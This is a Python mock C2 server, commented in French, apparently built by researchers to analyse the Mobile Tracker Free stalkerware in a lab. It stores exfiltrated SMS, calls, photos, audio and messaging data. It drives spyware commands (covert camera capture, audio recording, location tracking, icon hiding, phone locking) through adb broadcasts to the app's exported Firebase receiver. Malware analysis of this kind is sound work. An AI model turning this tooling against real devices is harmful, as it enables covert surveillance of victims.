#!/usr/bin/env python3
"""
Mobile Tracker Free — Mock C2 Server
=====================================

Serveur C2 factice pour l'analyse dynamique en lab (Corellium) du stalkerware
Mobile Tracker Free (payload `phone.monitor2026`, v161/v162).

Reversé depuis : mtf_c2_analysis.md, mtf_payload_analysis.md
Lab setup       : mtf_corellium_lab_setup.md

⚠️  Usage exclusivement recherche — ASTRA / LHS-LORIA.

--------------------------------------------------------------------------------
ARCHITECTURE C2 RÉELLE (3 canaux, cf. mtf_c2_analysis.md §1)
--------------------------------------------------------------------------------
  1. HTTPS Retrofit   — UPLINK   : exfiltration device -> serveur (37 endpoints .php)
  2. Firebase FCM     — DOWNLINK : commandes serveur -> device (champ `action`)
  3. Socket.IO        — LIVE     : streaming WebRTC / file explorer (hors périmètre mock)

Ce mock couvre le canal UPLINK complet (sink d'exfiltration) et le canal DOWNLINK
par PROCURATION : le mock ne peut PAS pousser de vrai message FCM (il faudrait la
server key Firebase du projet `myappmobile-537f7`, qu'on n'a pas — seule l'API key
cliente est dans l'APK). Le downlink se fait donc via `adb am broadcast` vers le
`FirebaseInstanceIdReceiver` exporté (même technique que mtf_cmd_trigger.py), piloté
depuis l'admin API de ce serveur. Les accusés de réception des commandes reviennent
naturellement sur le canal UPLINK via `remoteControl/setLog.php`, et sont corrélés
par `idLog`.

--------------------------------------------------------------------------------
CONTRAT PROTOCOLE (cf. mtf_c2_analysis.md §3-4)
--------------------------------------------------------------------------------
  User-Agent payload : ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019
  Auth               : champ form `tokenSecurity` (100 chars) présent sur CHAQUE requête
  3 familles de réponses attendues par l'APK :
    - m3135s  : POST form-data      -> l'APK vérifie que la réponse == "ok"  (texte brut)
    - m3136t  : POST multipart+file -> réponse "ok" (upload binaire)
    - m3129l  : POST form-data      -> réponse JSON parsée (verifPhone/savePhone/setLog)

--------------------------------------------------------------------------------
PORTS (cf. mtf_corellium_lab_setup.md §3.3, §6.3)
--------------------------------------------------------------------------------
  8443/tcp  HTTPS  — sink d'exfiltration (TLS, cert mock auto-généré)
                     redirigé depuis 443 par iptables sur la VM + `adb reverse tcp:8443`
  8080/tcp  HTTP   — admin/stats en clair (dashboard, pilotage des commandes)

--------------------------------------------------------------------------------
LANCEMENT
--------------------------------------------------------------------------------
  uv run python mtf_c2_server.py
  # options : --https-port 8443 --admin-port 8080 --host 0.0.0.0
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import datetime as dt
import ipaddress
import json
import subprocess
import threading
from collections import Counter
from pathlib import Path
from typing import Any, Optional

import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, PlainTextResponse
from starlette.datastructures import UploadFile

# ============================================================
# Constantes protocole (IOC — cf. mtf_c2_analysis.md §11)
# ============================================================

UA_PAYLOAD = "ILAHK20DKA8751LD9D729OJD6D7HJDK2AQMFT2019"
UA_DROPPER = "KABNKNHFFHDHYD58698347556988AD89GH2020"

FCM_SENDER = "38496474107"                       # Firebase sender id
FCM_RECEIVER = "com.google.firebase.iid.FirebaseInstanceIdReceiver"
PKG = "phone.monitor2026"

# Endpoints à réponse JSON (m3129l) — l'APK parse un JSONObject.
JSON_ENDPOINTS = {
    "user/verifPhone.php",
    "user/savePhone.php",
    "remoteControl/setLog.php",
}

# Endpoints à upload binaire multipart (m3136t).
FILE_ENDPOINTS = {
    "calls/insertCallRecord.php",
    "recordAudio/setRecordAudio.php",
    "pictures/insertPicture.php",
    "screenshot/insertScreen.php",
    "fileExplorer/insertNewFile.php",
    "fileExplorer/insertNewFileFirst.php",
}

# Endpoint spécial : la photo d'échec de déverrouillage arrive en Base64
# dans le champ form `data` (pas en part fichier), cf. §4.3.
PW_FAILED_ENDPOINT = "pictures/setPicturePasswordFailed.php"

# Répertoires de capture.
BASE_DIR = Path(__file__).resolve().parent
CAPTURE_DIR = BASE_DIR / "captures"
LOG_FILE = CAPTURE_DIR / "c2_server.log"
CERT_FILE = BASE_DIR / "mock.crt"
KEY_FILE = BASE_DIR / "mock.key"

# SAN du certificat mock (cf. mtf_corellium_lab_setup.md §4.1).
CERT_DNS = [
    "localhost",
    "mobile-track-data.com",
    "mobile-tracker-free.com",
    "tracker-free.com",
]
CERT_IPS = ["127.0.0.1", "10.11.1.1", "10.0.2.2"]


# ============================================================
# État partagé (in-memory) entre l'app HTTPS et l'app admin
# ============================================================

class State:
    """État global du mock, partagé entre les deux serveurs uvicorn."""

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.next_id_phone = 99999            # idPhone servi au prochain savePhone
        self.devices: dict[int, dict[str, Any]] = {}   # idPhone -> métadonnées
        self.exfil_counter: Counter = Counter()        # catégorie -> nb de hits
        self.request_count = 0
        # Corrélation downlink : idLog -> {cmd, action, sent_at, acked, result}
        self.pending_cmds: dict[str, dict[str, Any]] = {}
        self.recent: list[dict[str, Any]] = []          # 200 dernières requêtes (ring)

    def register_device(self, token: str, name: str) -> int:
        with self.lock:
            id_phone = self.next_id_phone
            self.next_id_phone += 1
            self.devices[id_phone] = {
                "idPhone": id_phone,
                "tokenSecurity": token,
                "namePhone": name,
                "first_seen": _now(),
                "last_seen": _now(),
                "exfil_hits": 0,
            }
            return id_phone

    def touch_device(self, id_phone: Optional[str], token: str) -> None:
        with self.lock:
            try:
                idp = int(id_phone) if id_phone is not None else None
            except (TypeError, ValueError):
                idp = None
            if idp is not None and idp in self.devices:
                self.devices[idp]["last_seen"] = _now()
                self.devices[idp]["exfil_hits"] += 1
            elif idp is not None:
                # Device jamais vu passer par savePhone (ex: snapshot restauré) :
                # on le crée à la volée pour ne rien perdre.
                self.devices[idp] = {
                    "idPhone": idp,
                    "tokenSecurity": token,
                    "namePhone": "(inconnu)",
                    "first_seen": _now(),
                    "last_seen": _now(),
                    "exfil_hits": 1,
                }

    def push_recent(self, entry: dict[str, Any]) -> None:
        with self.lock:
            self.recent.append(entry)
            if len(self.recent) > 200:
                self.recent.pop(0)


STATE = State()


# ============================================================
# Helpers
# ============================================================

def _now() -> str:
    return dt.datetime.now(dt.timezone.utc).isoformat()


def _stamp() -> str:
    return dt.datetime.now().strftime("%Y%m%d_%H%M%S_%f")


def _category(endpoint: str) -> str:
    """Catégorie de rangement dérivée du chemin de l'endpoint."""
    if endpoint.startswith("socialNetwork/noRoot/"):
        return "im_noroot"
    if endpoint.startswith("socialNetwork/root/"):
        return "im_root"
    return endpoint.split("/", 1)[0] if "/" in endpoint else endpoint


def _safe(name: str) -> str:
    return "".join(c if c.isalnum() or c in "-_." else "_" for c in name)[:120]


def log_line(msg: str) -> None:
    """Écrit une ligne horodatée dans captures/c2_server.log (+ stdout)."""
    line = f"[{_now()}] {msg}"
    print(line, flush=True)
    try:
        with LOG_FILE.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except OSError:
        pass


def save_json(category: str, endpoint: str, fields: dict[str, str]) -> None:
    """Sauvegarde les champs form d'une exfiltration texte."""
    out_dir = CAPTURE_DIR / category
    out_dir.mkdir(parents=True, exist_ok=True)
    payload = {
        "_endpoint": endpoint,
        "_received_at": _now(),
        **fields,
    }
    path = out_dir / f"{_stamp()}_{_safe(endpoint.replace('/', '_'))}.json"
    path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")


def save_blob(category: str, endpoint: str, filename: str, data: bytes) -> Path:
    """Sauvegarde un fichier binaire exfiltré (audio, photo, screenshot, fichier)."""
    out_dir = CAPTURE_DIR / category / "files"
    out_dir.mkdir(parents=True, exist_ok=True)
    path = out_dir / f"{_stamp()}_{_safe(filename or 'blob.bin')}"
    path.write_bytes(data)
    return path


# ============================================================
# App HTTPS — sink d'exfiltration (:8443)
# ============================================================

app = FastAPI(title="MTF Mock C2 — exfil sink", docs_url=None, redoc_url=None)


@app.get("/")
async def root_banner() -> PlainTextResponse:
    # Façade anodine si quelqu'un GET la racine.
    return PlainTextResponse("ok")


@app.get("/{full_path:path}")
async def get_catchall(full_path: str) -> PlainTextResponse:
    # Le protocole MTF est intégralement en POST ; on répond "ok" par défaut.
    return PlainTextResponse("ok")


@app.post("/{full_path:path}")
async def exfil_catchall(full_path: str, request: Request):
    """
    Route fourre-tout : gère les 37 endpoints .php (y compris les endpoints IM
    'inférés' et le champ dynamique `urlScript` des messageries), sur le chemin
    principal ('/') comme sur le fallback ('/scriptsV5/').
    """
    endpoint = full_path
    # Normalise le préfixe fallback `mobile-tracker-free.com/scriptsV5/...`
    if endpoint.startswith("scriptsV5/"):
        endpoint = endpoint[len("scriptsV5/"):]
    endpoint = endpoint.lstrip("/")

    ua = request.headers.get("user-agent", "")
    is_dropper = ua == UA_DROPPER

    # Parse le corps : gère à la fois urlencoded et multipart.
    fields: dict[str, str] = {}
    files: list[tuple[str, str, bytes]] = []   # (part_name, filename, data)
    try:
        form = await request.form()
        for key, value in form.multi_items():
            if isinstance(value, UploadFile):
                files.append((key, value.filename or "blob.bin", await value.read()))
            else:
                fields[key] = value
    except Exception as exc:  # noqa: BLE001 — on veut tout logger, jamais planter
        raw = await request.body()
        fields["_parse_error"] = str(exc)
        fields["_raw_len"] = str(len(raw))

    id_phone = fields.get("idPhone")
    token = fields.get("tokenSecurity", "")
    category = _category(endpoint)

    with STATE.lock:
        STATE.request_count += 1
        STATE.exfil_counter[category] += 1
    STATE.touch_device(id_phone, token)
    STATE.push_recent({
        "at": _now(), "endpoint": endpoint, "category": category,
        "idPhone": id_phone, "ua": "dropper" if is_dropper else "payload",
        "n_fields": len(fields), "n_files": len(files),
    })

    tok_preview = (token[:16] + "…") if len(token) > 16 else token
    log_line(
        f"POST /{endpoint}  cat={category}  idPhone={id_phone}  "
        f"fields={len(fields)}  files={len(files)}  token={tok_preview!r}"
        + ("  [DROPPER UA]" if is_dropper else "")
    )

    # --- Sauvegarde des parts fichier ---
    for part_name, filename, data in files:
        saved = save_blob(category, endpoint, filename, data)
        log_line(f"    ↳ blob {part_name}={filename} ({len(data)} B) → {saved.name}")

    # --- Endpoint spécial : photo d'échec de déverrouillage (Base64 dans `data`) ---
    if endpoint == PW_FAILED_ENDPOINT and "data" in fields:
        try:
            raw_img = base64.b64decode(fields["data"], validate=False)
            saved = save_blob(category, endpoint, "password_failed.jpg", raw_img)
            log_line(f"    ↳ photo échec unlock (base64, {len(raw_img)} B) → {saved.name}")
            fields = {k: v for k, v in fields.items() if k != "data"}
            fields["_data_saved_as"] = saved.name
        except Exception as exc:  # noqa: BLE001
            log_line(f"    ⚠ décodage base64 échoué : {exc}")

    # --- ACK de commande FCM sur remoteControl/setLog.php ---
    if endpoint == "remoteControl/setLog.php":
        _handle_command_ack(fields)

    # Toujours archiver les champs texte (même quand il y a des fichiers).
    save_json(category, endpoint, fields)

    # --- Réponses par famille (cf. contrat protocole) ---
    if endpoint == "user/verifPhone.php":
        # Le device existe déjà ? On répond ok avec un compteur non nul.
        return JSONResponse({"status": "ok", "nbPhone": 1})

    if endpoint == "user/savePhone.php":
        name = fields.get("namePhone", "(sans nom)")
        id_new = STATE.register_device(token, name)
        log_line(f"    ↳ REGISTER  idPhone={id_new}  namePhone={name!r}")
        return JSONResponse({"status": "ok", "idPhone": id_new})

    if endpoint in JSON_ENDPOINTS:
        # setLog & autres m3129l : JSON générique.
        return JSONResponse({"status": "ok"})

    # m3135s / m3136t : l'APK attend le texte brut "ok".
    return PlainTextResponse("ok")


def _handle_command_ack(fields: dict[str, str]) -> None:
    """
    Corrèle un accusé de réception de commande FCM (setLog) avec la commande
    poussée depuis l'admin API. Champs : idLog, type, data.
    """
    id_log = fields.get("idLog", "")
    result = fields.get("data", "")
    with STATE.lock:
        entry = STATE.pending_cmds.get(id_log)
        if entry is not None:
            entry["acked"] = True
            entry["acked_at"] = _now()
            entry["result"] = result
            log_line(
                f"    ↳ ACK cmd '{entry['cmd']}' (idLog={id_log}) → "
                f"{result[:80]!r}"
            )
        else:
            log_line(f"    ↳ setLog idLog={id_log} type={fields.get('type')!r} "
                     f"data={result[:80]!r}  (non corrélé)")


# ============================================================
# App admin — pilotage & stats (:8080, HTTP clair)
# ============================================================

admin = FastAPI(title="MTF Mock C2 — admin", docs_url="/docs", redoc_url=None)

# idLog auto-incrémenté pour les commandes poussées.
_ID_LOG = [1000]


def _next_idlog() -> str:
    _ID_LOG[0] += 1
    return str(_ID_LOG[0])


# Vocabulaire de commandes FCM (action string), aligné sur mtf_cmd_trigger.py.
# La dernière section `--{idLog}` sert de clé de corrélation avec setLog.
def _cmd_builders() -> dict[str, Any]:
    return {
        # Localisation
        "location":        lambda a, i: f"GetLocation----{i}",
        "loc_live_on":     lambda a, i: f"startLocLive--1----{i}",
        "loc_live_off":    lambda a, i: f"startLocLive--0----{i}",
        "gps_on":          lambda a, i: f"activateLocGPS----{i}",
        "gps_off":         lambda a, i: f"disabledLocGPS----{i}",
        # Caméra
        "photo_front":     lambda a, i: f"TakePictureFront--1##0--{i}",
        "photo_front_flash": lambda a, i: f"TakePictureFront--1##1--{i}",
        "photo_rear":      lambda a, i: f"TakePictureFront--2##0--{i}",
        "photo_rear_flash": lambda a, i: f"TakePictureFront--2##1--{i}",
        # Audio
        "audio":           lambda a, i: f"RecordAudio--{a or '30'}--1--{i}",
        # Écran
        "screenshot":      lambda a, i: f"screenShot----{i}",
        "screenshot_mp":   lambda a, i: f"takeScreenShot----{i}",
        # Furtivité
        "hide":            lambda a, i: f"hideIcon----{i}",
        "show":            lambda a, i: f"showIcon----{i}",
        # Contrôle device
        "lock":            lambda a, i: f"LockPhone--{a or '1234'}----{i}",
        "unlock":          lambda a, i: f"UnLockPhone----{i}",
        "vibrate":         lambda a, i: f"Vibrate--{a or '3000'}--Vibrate--{i}",
        "ring":            lambda a, i: f"Ring--{a or '5000'}--Ring--{i}",
        "tts":             lambda a, i: f"TextSpeaker--{a or 'test'}--fr--{i}",
        "reboot":          lambda a, i: f"restartPhone----{i}",
        # Réseau
        "wifi_on":         lambda a, i: f"activateWIFI----{i}",
        "wifi_off":        lambda a, i: f"disabledWIFI----{i}",
        "data_on":         lambda a, i: f"enabledDataMobile----{i}",
        "data_off":        lambda a, i: f"disabledDataMobile----{i}",
        # Extraction
        "get_sms":         lambda a, i: f"getListMessage--{a or '30'}--{i}",
        "get_calls":       lambda a, i: f"getListCall--{a or '30'}--{i}",
        "get_contacts":    lambda a, i: f"getListContacts----{i}",
        "get_history":     lambda a, i: f"getListHistoryChrome--{a or '30'}--{i}",
        # IM root
        "get_facebook":    lambda a, i: f"getListFacebook----{i}",
        "get_whatsapp":    lambda a, i: f"getListWhatsApp----{i}",
        "get_telegram":    lambda a, i: f"getListTelegram----{i}",
        "get_instagram":   lambda a, i: f"getListInstagram----{i}",
        "get_viber":       lambda a, i: f"getListViber----{i}",
        "get_gmail":       lambda a, i: f"getListGmail----{i}",
        # Live
        "live_start":      lambda a, i: f"startLive--1----{i}",
        "live_stop":       lambda a, i: f"startLive--0----{i}",
        "file_explorer":   lambda a, i: f"startFileExplorer----{i}",
        # Admin device
        "sim_info":        lambda a, i: f"getInfoSIM----{i}",
    }


def _adb_broadcast(action: str, serial: Optional[str]) -> tuple[bool, str]:
    """
    Pousse une commande FCM via `am broadcast` vers le FirebaseInstanceIdReceiver
    exporté (cf. mtf_cmd_trigger.py). Nécessite adb atteignable depuis l'hôte.
    """
    target = ["adb"]
    if serial:
        target += ["-s", serial]
    target += [
        "shell", "am", "broadcast",
        "-a", "com.google.android.c2dm.intent.RECEIVE",
        "-n", f"{PKG}/{FCM_RECEIVER}",
        "--es", "action", action,
        "-c", "com.google.android.c2dm.intent.RECEIVE",
        "--es", "from", FCM_SENDER,
        "--es", "google.message_id", f"mock_{_stamp()}",
        "--es", "collapse_key", "do_not_collapse",
    ]
    try:
        res = subprocess.run(target, capture_output=True, text=True, timeout=20)
        ok = res.returncode == 0 and "Broadcast completed" in (res.stdout + res.stderr)
        return ok, (res.stdout or res.stderr).strip()[:400]
    except FileNotFoundError:
        return False, "adb introuvable sur l'hôte du mock"
    except subprocess.TimeoutExpired:
        return False, "timeout adb (20s)"


@admin.get("/_stats")
async def stats() -> JSONResponse:
    with STATE.lock:
        pending = [c for c in STATE.pending_cmds.values() if not c.get("acked")]
        return JSONResponse({
            "requests_total": STATE.request_count,
            "devices": len(STATE.devices),
            "exfil_by_category": dict(STATE.exfil_counter),
            "commands_sent": len(STATE.pending_cmds),
            "commands_pending_ack": len(pending),
            "capture_dir": str(CAPTURE_DIR),
        })


@admin.get("/_devices")
async def devices() -> JSONResponse:
    with STATE.lock:
        return JSONResponse(list(STATE.devices.values()))


@admin.get("/_recent")
async def recent() -> JSONResponse:
    with STATE.lock:
        return JSONResponse(STATE.recent[-50:])


@admin.get("/_commands")
async def commands_log() -> JSONResponse:
    with STATE.lock:
        return JSONResponse(list(STATE.pending_cmds.values()))


@admin.get("/_cmd_list")
async def cmd_list() -> JSONResponse:
    return JSONResponse(sorted(_cmd_builders().keys()))


@admin.post("/admin/cmd/{name}")
async def push_cmd(name: str, arg: Optional[str] = None,
                   serial: Optional[str] = None) -> JSONResponse:
    """
    Pousse une commande FCM nommée vers le device (via adb).
    Ex : POST /admin/cmd/audio?arg=60   |   POST /admin/cmd/photo_front
    """
    builders = _cmd_builders()
    if name not in builders:
        return JSONResponse(
            {"error": f"commande inconnue : {name}",
             "hint": "GET /_cmd_list pour la liste"},
            status_code=404,
        )
    id_log = _next_idlog()
    action = builders[name](arg, id_log)
    ok, output = _adb_broadcast(action, serial)
    entry = {
        "cmd": name, "action": action, "idLog": id_log,
        "sent_at": _now(), "adb_ok": ok, "adb_output": output,
        "acked": False, "result": None,
    }
    with STATE.lock:
        STATE.pending_cmds[id_log] = entry
    log_line(f"CMD push '{name}' action={action!r} adb_ok={ok}")
    return JSONResponse(entry, status_code=200 if ok else 502)


@admin.post("/admin/raw")
async def push_raw(action: str, serial: Optional[str] = None) -> JSONResponse:
    """
    Pousse une action FCM brute (ex : action=GetLocation----42).
    Le dernier segment `--{idLog}` est utilisé pour la corrélation si présent.
    """
    id_log = action.rsplit("--", 1)[-1] if "--" in action else _next_idlog()
    ok, output = _adb_broadcast(action, serial)
    entry = {
        "cmd": "raw", "action": action, "idLog": id_log,
        "sent_at": _now(), "adb_ok": ok, "adb_output": output,
        "acked": False, "result": None,
    }
    with STATE.lock:
        STATE.pending_cmds[id_log] = entry
    log_line(f"CMD raw action={action!r} adb_ok={ok}")
    return JSONResponse(entry, status_code=200 if ok else 502)


# ============================================================
# Certificat TLS auto-signé
# ============================================================

def ensure_cert() -> None:
    """Génère mock.crt + mock.key (self-signed, SAN large) si absents."""
    if CERT_FILE.exists() and KEY_FILE.exists():
        return
    # Import local : cryptography n'est nécessaire qu'à la génération.
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    log_line("Génération du certificat mock (mock.crt / mock.key)…")
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "mobile-track-data.com"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "MTF Mock C2 (research)"),
    ])
    san: list[x509.GeneralName] = [x509.DNSName(d) for d in CERT_DNS]
    san += [x509.IPAddress(ipaddress.ip_address(ip)) for ip in CERT_IPS]

    now = dt.datetime.now(dt.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - dt.timedelta(days=1))
        .not_valid_after(now + dt.timedelta(days=3650))
        .add_extension(x509.SubjectAlternativeName(san), critical=False)
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .sign(key, hashes.SHA256())
    )
    KEY_FILE.write_bytes(key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption(),
    ))
    CERT_FILE.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    log_line(f"Certificat écrit. SAN DNS={CERT_DNS} IP={CERT_IPS}")


# ============================================================
# Lancement des deux serveurs
# ============================================================

def _serve_admin(host: str, port: int) -> None:
    # uvicorn dans un thread non-principal : désactiver les signal handlers.
    config = uvicorn.Config(admin, host=host, port=port, log_level="warning")
    server = uvicorn.Server(config)
    server.install_signal_handlers = lambda: None
    asyncio.run(server.serve())


def main() -> None:
    parser = argparse.ArgumentParser(description="Mobile Tracker Free — Mock C2 Server")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--https-port", type=int, default=8443,
                        help="port TLS du sink d'exfiltration (défaut 8443)")
    parser.add_argument("--admin-port", type=int, default=8080,
                        help="port HTTP clair de l'admin/stats (défaut 8080)")
    args = parser.parse_args()

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    ensure_cert()

    log_line("=" * 64)
    log_line("MTF Mock C2 Server")
    log_line(f"  HTTPS (exfil)  : https://{args.host}:{args.https_port}")
    log_line(f"  HTTP  (admin)  : http://{args.host}:{args.admin_port}  (/_stats, /docs)")
    log_line(f"  Captures       : {CAPTURE_DIR}")
    log_line(f"  UA payload     : {UA_PAYLOAD}")
    log_line("=" * 64)

    # Admin en tâche de fond, exfil sink au premier plan.
    threading.Thread(
        target=_serve_admin, args=(args.host, args.admin_port), daemon=True
    ).start()

    uvicorn.run(
        app,
        host=args.host,
        port=args.https_port,
        ssl_certfile=str(CERT_FILE),
        ssl_keyfile=str(KEY_FILE),
        log_level="info",
    )


if __name__ == "__main__":
    main()
